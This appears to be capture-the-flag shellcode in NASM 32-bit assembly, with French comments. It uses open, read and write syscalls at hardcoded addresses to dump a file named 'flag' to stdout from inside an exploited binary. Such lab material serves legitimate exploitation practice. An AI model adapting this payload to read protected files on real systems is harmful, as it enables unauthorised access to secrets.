[BITS 32]
section .text

; nasm -f bin asmforFlag.S -o shell
; le 32 bits est convertible avec le 64 si les addr sont compatibles 32 bits

; fd = open ("flag", 0, 0)
mov eax, 5
mov ebx, 0x402010 ; char *filename
mov ecx, 0x0 ; flag
mov edx, 0x0 ; mode
int 0x80
mov esi, eax ; save file descriptor

; read (fd, @bss, 0x80) on a le droit d'Ã©crire sur bss
mov eax, 3
mov ebx, esi ; fd
mov ecx, 0x04040A0 ; buf
mov edx, 0x80 ; count
int 0x80

; write (1, @bss, 0x80)
mov edx, eax ; count
mov eax, 4
mov ebx, 1 ; fd : stdout
mov ecx, 0x04040A0 ; buf
int 0x80